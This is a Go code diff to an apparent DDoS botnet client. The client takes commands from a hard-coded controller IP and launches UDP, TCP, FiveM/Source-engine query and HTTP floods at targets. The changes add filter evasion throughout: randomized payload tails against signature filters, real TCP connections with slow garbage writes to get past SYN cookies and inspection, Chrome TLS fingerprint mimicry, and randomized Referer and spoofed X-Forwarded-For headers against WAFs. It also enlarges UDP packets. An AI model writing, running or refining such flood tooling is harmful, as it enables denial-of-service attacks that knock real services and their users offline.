@@ -1,7 +1,7 @@
 package main
 
 import (
-	"crypto/tls"
+	"context"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -15,6 +15,8 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
+
+	utls "github.com/refraction-networking/utls"
 )
 
 const (
@@ -129,22 +131,50 @@ func AUdpFlood(IP, PORT string, SECONDS int, SIZE int, sessionID int32) {
 		go func() {
 			defer wg.Done()
 			
-			// Dial once per worker and keep the socket hot
-			conn, err := net.DialUDP("udp4", nil, raddr)
-			if err != nil {
+			var conn *net.UDPConn
+			var err error
+			totalSent := 0
+			const rotateEvery = 50000
+
+			reconnect := func() {
+				if conn != nil {
+					conn.Close()
+				}
+				conn, err = net.DialUDP("udp4", nil, raddr)
+				if err == nil {
+					conn.SetWriteBuffer(4 * 1024 * 1024)
+				}
+			}
+
+			reconnect()
+			if conn == nil {
 				return
 			}
-			conn.SetWriteBuffer(4 * 1024 * 1024)
 			defer conn.Close()
+
+			workerPayload := make([]byte, SIZE)
+			copy(workerPayload, payload)
 
 			for {
 				if atomic.LoadInt32(&globalSessionID) != sessionID {
 					return
 				}
 				
-				// Zero-allocation tight loop
+				// Randomize a small portion of the payload to bypass signature-based filters
+				if len(workerPayload) > 16 {
+					rand.Read(workerPayload[len(workerPayload)-16:])
+				}
+
 				for j := 0; j < batch; j++ {
-					conn.Write(payload)
+					conn.Write(workerPayload)
+					totalSent++
+					if totalSent >= rotateEvery {
+						reconnect()
+						if conn == nil {
+							return
+						}
+						totalSent = 0
+					}
 				}
 				atomic.AddInt64(&ppsCounter, int64(batch))
 			}
@@ -201,7 +231,9 @@ func AUdpBypass(IP, PORT string, SECONDS int, sessionID int32) {
 
 	for i := 0; i < variants; i++ {
 		base := basePayloads[i%len(basePayloads)]
-		p := make([]byte, len(base)+rand.Intn(64))
+		// High GB/s focus: Pad to near MTU (1300-1450 bytes)
+		size := 1300 + rand.Intn(150)
+		p := make([]byte, size)
 		copy(p, base)
 		if len(p) > len(base) {
 			rand.Read(p[len(base):])
@@ -295,8 +327,10 @@ func AUdpBypass(IP, PORT string, SECONDS int, sessionID int32) {
 					return
 				}
 				pps := atomic.SwapInt64(&ppsCounter, 0)
-				fmt.Printf("[%s] ADV-BYPASS PPS: %d\n",
-					time.Now().Format("15:04:05"), pps)
+				// Calculate GB/s for bypass
+				gbps := float64(pps) * 1350 * 8 / 1e9 // Avg size 1350
+				fmt.Printf("[%s] ADV-BYPASS Stats: %d PPS | %.2f Gbit/s\n",
+					time.Now().Format("15:04:05"), pps, gbps)
 			}
 		}
 	}()
@@ -549,16 +583,50 @@ func ATcpFlood(IP, PORT string, SECONDS int, sessionID int32) {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
+			
+			// Full-State TCP Bypass: Establish real connections to bypass SYN cookies
+			// and stateful inspection, then push HTTP-like garbage.
 			for {
 				if atomic.LoadInt32(&globalSessionID) != sessionID {
 					return
 				}
-				conn, err := net.DialTimeout("tcp", target, 2*time.Second)
+				
+				// Dial with timeout
+				conn, err := net.DialTimeout("tcp", target, 3*time.Second)
 				if err == nil {
-					conn.SetDeadline(time.Now().Add(2 * time.Second))
-					conn.Write(payload)
+					conn.SetDeadline(time.Now().Add(10 * time.Second))
+					
+					// Push random HTTP-like garbage to trick DPI
+					methods := []string{"GET ", "POST ", "HEAD ", "OPTIONS "}
+					method := methods[rand.Intn(len(methods))]
+					
+					path := make([]byte, 16+rand.Intn(32))
+					rand.Read(path)
+					
+					fakeHttpHeader := fmt.Sprintf("%s/%x HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", method, path, IP)
+					conn.Write([]byte(fakeHttpHeader))
+					
+					// Keep connection alive and bleed it with random chunks
+					for j := 0; j < 5; j++ {
+						if atomic.LoadInt32(&globalSessionID) != sessionID {
+							break
+						}
+						writeSize := 64 + rand.Intn(512)
+						if writeSize > len(payload) {
+							writeSize = len(payload)
+						}
+						// Artificial delay simulating slow client
+						time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)
+						_, err := conn.Write(payload[:writeSize])
+						if err != nil {
+							break
+						}
+					}
+					
 					conn.Close()
 					atomic.AddInt64(&connCounter, 1)
+				} else {
+					time.Sleep(1 * time.Millisecond)
 				}
 			}
 		}()
@@ -603,9 +671,11 @@ func AFivemFlood(IP, PORT string, SECONDS int, sessionID int32) {
 		return
 	}
 
+	// FiveM / Source Engine exact OOB payloads.
 	payloads := [][]byte{
-		[]byte("\xff\xff\xff\xffgetinfo xxx\x00"),
-		[]byte("\xff\xff\xff\xffgetstatus\x00"),
+		[]byte("\xff\xff\xff\xffgetinfo \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
+		[]byte("\xff\xff\xff\xffgetstatus"),
+		[]byte("\xff\xff\xff\xffgetchallenge 0000000000"),
 		[]byte("\xff\xff\xff\xffTSource Engine Query\x00"),
 	}
 
@@ -719,13 +789,33 @@ func AHttpFlood(targetURL string, seconds int, sessionID int32) {
 
 	var reqCounter int64 = 0
 
+	// U-TLS Dialer to perfectly mimic Google Chrome
+	utlsDialer := func(ctx context.Context, network, addr string) (net.Conn, error) {
+		dialer := net.Dialer{Timeout: 5 * time.Second}
+		rawConn, err := dialer.DialContext(ctx, network, addr)
+		if err != nil {
+			return nil, err
+		}
+
+		host, _, _ := net.SplitHostPort(addr)
+		
+		config := &utls.Config{ServerName: host, InsecureSkipVerify: true}
+		uconn := utls.UClient(rawConn, config, utls.HelloChrome_102)
+		
+		err = uconn.Handshake()
+		if err != nil {
+			rawConn.Close()
+			return nil, err
+		}
+		
+		return uconn, nil
+	}
+
 	transport := &http.Transport{
 		MaxIdleConns:        1024,
 		MaxIdleConnsPerHost: 1024,
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
-		},
-		DisableCompression: true,
+		DialTLSContext:      utlsDialer,
+		DisableCompression:  true,
 	}
 
 	client := &http.Client{
@@ -741,12 +831,33 @@ func AHttpFlood(targetURL string, seconds int, sessionID int32) {
 
 	// Pre-generate request pool
 	const poolSize = 1024
+	referers := []string{
+		"https://www.google.com/",
+		"https://www.bing.com/",
+		"https://www.facebook.com/",
+		"https://www.twitter.com/",
+		"https://www.reddit.com/",
+		targetURL,
+	}
+
 	reqPool := make([]*http.Request, poolSize)
 	for i := 0; i < poolSize; i++ {
 		req, _ := http.NewRequest("GET", targetURL, nil)
 		req.Header.Set("User-Agent", AUserAgents[rand.Intn(len(AUserAgents))])
 		req.Header.Set("Accept", "*/*")
+		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
 		req.Header.Set("Connection", "keep-alive")
+
+		// Vary headers to bypass cache and WAF signatures
+		if rand.Float32() > 0.5 {
+			req.Header.Set("Cache-Control", "no-cache")
+		} else {
+			req.Header.Set("Cache-Control", "max-age=0")
+		}
+
+		req.Header.Set("Referer", referers[rand.Intn(len(referers))])
+		req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
+
 		reqPool[i] = req
 	}
 
@@ -811,7 +922,7 @@ func main() {
 		CheckForUpdates(githubUpdateURL)
 	}
 
-	controllerAddr := "89.36.35.109:9999"
+	controllerAddr := "45.92.217.122:9999"
 	if len(os.Args) >= 2 {
 		controllerAddr = os.Args[1]
 	}
@@ -844,7 +955,7 @@ func main() {
 
 			switch cmd.Method {
 			case "UDP":
-				go AUdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 1472, sessionID)
+				go AUdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 65000, sessionID)
 			case "TCP":
 				go ATcpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
 			case "FIVEM":
